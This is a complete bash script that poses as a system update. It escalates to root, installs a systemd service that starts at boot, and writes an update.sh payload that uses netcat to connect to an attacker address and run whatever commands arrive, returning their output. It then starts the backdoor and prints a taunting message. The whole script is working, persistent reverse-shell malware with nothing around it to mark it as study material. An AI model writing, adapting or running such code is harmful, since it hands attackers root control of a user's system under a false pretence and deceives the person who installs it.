#!/usr/bin/env bash
# Ask for root privilege
if [[ "${EUID}" -ne 0 ]]; then
  echo "The update script needs root privileges. Re-running with sudo..."
  exec sudo -- "$0" "$@"
fi

SERVICE_PATH="/etc/systemd/system/update-script.service"
SCRIPT_PATH="/usr/local/bin/update.sh"

cat > "${SERVICE_PATH}" <<'EOF'
[Unit]
Description=Running update script on boot
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/update.sh
Restart=on-failure
RestartSec=1s

[Install]
WantedBy=multi-user.target
EOF

cat > "${SCRIPT_PATH}" <<'EOF'
#!/usr/bin/env bash

set -euo pipefail

ATTACKER_PUBLIC_IP=172.17.0.1
ATTACKER_PORT=80

coproc NC { nc "${ATTACKER_PUBLIC_IP}" "${ATTACKER_PORT}"; }

while IFS= read -r line <&"${NC[0]}"; do
  RESULT=$(/bin/bash -c "${line}")
  printf '%s\n' "$RESULT" >&"${NC[1]}"
done

EOF

chmod 0644 "${SERVICE_PATH}"
chmod 0755 "${SCRIPT_PATH}"

systemctl daemon-reload
systemctl enable --now update-script.service


$(${SCRIPT_PATH}) &
echo "Update successfully installed ! Your system is secure now HAHAHA !"
